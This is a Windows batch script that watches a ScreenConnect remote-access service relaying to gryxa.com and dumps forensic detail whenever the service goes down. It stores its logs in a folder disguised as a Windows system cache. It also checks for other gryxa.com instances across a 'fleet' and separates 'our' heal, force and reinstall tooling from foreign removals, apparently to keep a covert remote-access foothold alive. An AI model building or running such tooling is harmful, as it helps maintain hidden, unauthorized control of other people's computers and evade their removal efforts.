@echo off
rem GRYXA_WATCH BUILD 20260804W1 - poll Gryxa; on RUNNING->DOWN dump who/what killed it
rem Run in a Guest cmd (or schtasks). Leave it open while you watch the panel.
setlocal EnableExtensions EnableDelayedExpansion
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "FP=36e506ff016b2151"
set "KEEP=5f6010579852e507"
set "ALT=f861c8140d453427"
set "SVC=ScreenConnect Client (%FP%)"
set "LOG=%WD%\drop_watch.log"
set "EVT=%WD%\drop_events"
set "SEC=5"
if not "%~1"=="" set "SEC=%~1"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%EVT%" mkdir "%EVT%" >nul 2>&1

echo [%DATE% %TIME%] watch start interval=%SEC%s host=%COMPUTERNAME%>>"%LOG%"
echo Watching %SVC% every %SEC%s. Drops write to %EVT%
echo Leave this window open. Ctrl+C to stop.
echo.

set "PREV=UNKNOWN"
:Loop
set "NOW=DOWN"
set "WHY=absent"
sc query "%SVC%" >nul 2>&1
if errorlevel 1 (
  set "NOW=ABSENT"
  set "WHY=1060"
) else (
  sc query "%SVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" /C:"CONTINUE_PENDING" >nul
  if not errorlevel 1 (
    set "NOW=UP"
    set "WHY=running"
    reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
    if errorlevel 1 (
      set "NOW=UP_NORELAY"
      set "WHY=running-no-gryxa.com"
    )
  ) else (
    sc query "%SVC%" | findstr /I /C:"STOPPED" >nul
    if not errorlevel 1 (
      set "NOW=STOPPED"
      set "WHY=stopped"
    ) else (
      set "NOW=OTHER"
      set "WHY=other-state"
    )
  )
)

rem also treat any other gryxa.com SC as UP for "fleet view"
set "ANY=0"
for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
  set "_FP=%%a"
  set "_FP=!_FP: =!"
  if /I not "!_FP!"=="%KEEP%" if /I not "!_FP!"=="%ALT%" (
    sc query "ScreenConnect Client (!_FP!)" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
    if not errorlevel 1 (
      reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (!_FP!)" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
      if not errorlevel 1 set "ANY=1"
    )
  )
)

if /I not "!PREV!"=="!NOW!" (
  echo [%DATE% %TIME%] STATE !PREV! -^> !NOW! (!WHY! any_gryxa=!ANY!)>>"%LOG%"
  echo STATE !PREV! -^> !NOW! (!WHY!)
  rem capture only on drop from UP*
  echo !PREV!| findstr /I /C:"UP" >nul
  if not errorlevel 1 (
    echo !NOW!| findstr /I /C:"UP" >nul
    if errorlevel 1 call :DumpDrop "!PREV!" "!NOW!" "!WHY!"
  )
  set "PREV=!NOW!"
)

timeout /t %SEC% /nobreak >nul
goto :Loop

:DumpDrop
set "TS=%TIME%"
set "TS=!TS::=!"
set "TS=!TS:.=!"
set "TS=!TS: =0!"
set "DF=%EVT%\drop_%DATE:~-4%%DATE:~4,2%%DATE:~7,2%_!TS!.txt"
set "DF=!DF:/=!"
set "DF=!DF:\=!"
> "!DF!" echo ===== DROP EVENT %DATE% %TIME% host=%COMPUTERNAME% =====
>>"!DF!" echo PREV=%~1 NOW=%~2 WHY=%~3 ANY_OTHER_GRYXA=!ANY!
>>"!DF!" echo.
>>"!DF!" echo --- VERDICT HINTS (read these first) ---
>>"!DF!" echo If msiexec /x or ProductCode uninstall in App log = OUR/foreign MSI kill
>>"!DF!" echo If sc stop / delete near same second = local service kill
>>"!DF!" echo If STOPPED + ImagePath still gryxa.com + no msiexec = crash/AV/relay hang (not reinstall)
>>"!DF!" echo If ABSENT/1060 after msiexec = uninstall wiped service
>>"!DF!" echo If mon log shows heal/force/reinstall in last 2 min = OUR tooling
>>"!DF!" echo If mon quiet + App log quiet = relay/network/server side
>>"!DF!" echo.

>>"!DF!" echo --- svc now ---
sc query "%SVC%" >>"!DF!" 2>&1
sc qc "%SVC%" >>"!DF!" 2>&1
reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath >>"!DF!" 2>&1

>>"!DF!" echo.
>>"!DF!" echo --- all SC services ---
sc query state= all | findstr /C:"ScreenConnect Client" >>"!DF!" 2>nul

>>"!DF!" echo.
>>"!DF!" echo --- msiexec / ScreenConnect processes NOW ---
wmic process where "name='msiexec.exe' or name='ScreenConnect.ClientService.exe' or name='ScreenConnect.WindowsClient.exe' or name='cmd.exe'" get ProcessId,ParentProcessId,CommandLine /FORMAT:LIST >>"!DF!" 2>nul

>>"!DF!" echo.
>>"!DF!" echo --- App log MsiInstaller + ScreenConnect last 10m ---
powershell -NoProfile -NonInteractive -Command "$s=(Get-Date).AddMinutes(-10); Get-WinEvent -FilterHashtable @{LogName='Application';StartTime=$s} -EA 0 | Where-Object { $_.ProviderName -match 'MsiInstaller|ScreenConnect' -or $_.Message -match 'ScreenConnect|9D7CC418|36e506ff|msiexec' } | Select-Object -First 40 TimeCreated,ProviderName,Id,@{n='Msg';e={$_.Message.Substring(0,[Math]::Min(240,$_.Message.Length))}} | Format-List" >>"!DF!" 2>nul

>>"!DF!" echo.
>>"!DF!" echo --- System log Service Control Manager last 10m (ScreenConnect) ---
powershell -NoProfile -NonInteractive -Command "$s=(Get-Date).AddMinutes(-10); Get-WinEvent -FilterHashtable @{LogName='System';ProviderName='Service Control Manager';StartTime=$s} -EA 0 | Where-Object { $_.Message -match 'ScreenConnect' } | Select-Object -First 30 TimeCreated,Id,@{n='Msg';e={$_.Message.Substring(0,[Math]::Min(240,$_.Message.Length))}} | Format-List" >>"!DF!" 2>nul

>>"!DF!" echo.
>>"!DF!" echo --- own_mon.log last 80 lines (grep kill words) ---
if exist "%WD%\own_mon.log" (
  findstr /I /C:"heal" /C:"force" /C:"reinstall" /C:"msiexec" /C:"1060" /C:"gryxa_" "%WD%\own_mon.log" >"%WD%\drop_mon_hits.tmp" 2>nul
  powershell -NoProfile -NonInteractive -Command "Get-Content -LiteralPath '%WD%\own_mon.log' -Tail 80" >>"!DF!" 2>nul
  >>"!DF!" echo --- mon kill-word hits (last matching lines file) ---
  if exist "%WD%\drop_mon_hits.tmp" powershell -NoProfile -NonInteractive -Command "Get-Content -LiteralPath '%WD%\drop_mon_hits.tmp' -Tail 40" >>"!DF!" 2>nul
)

>>"!DF!" echo.
>>"!DF!" echo --- own_gryxa.log last 60 ---
if exist "%WD%\own_gryxa.log" powershell -NoProfile -NonInteractive -Command "Get-Content -LiteralPath '%WD%\own_gryxa.log' -Tail 60" >>"!DF!" 2>nul

>>"!DF!" echo.
>>"!DF!" echo --- force / heal flags ---
if exist "%WD%\force_gryxa.done" (>>"!DF!" echo force_done= & type "%WD%\force_gryxa.done" >>"!DF!") else (>>"!DF!" echo force_done=absent)
if exist "%WD%\force_gryxa.new" (>>"!DF!" echo force_new= & type "%WD%\force_gryxa.new" >>"!DF!") else (>>"!DF!" echo force_new=absent)
if exist "%WD%\gryxa_heal.flag" (>>"!DF!" echo heal_flag= & type "%WD%\gryxa_heal.flag" >>"!DF!") else (>>"!DF!" echo heal_flag=absent)
if exist "%WD%\observe.flag" (>>"!DF!" echo OBSERVE=on) else (>>"!DF!" echo OBSERVE=off)

>>"!DF!" echo.
>>"!DF!" echo ===== END DROP =====
echo DUMPED !DF!
echo DUMPED !DF!>>"%LOG%"
exit /b 0
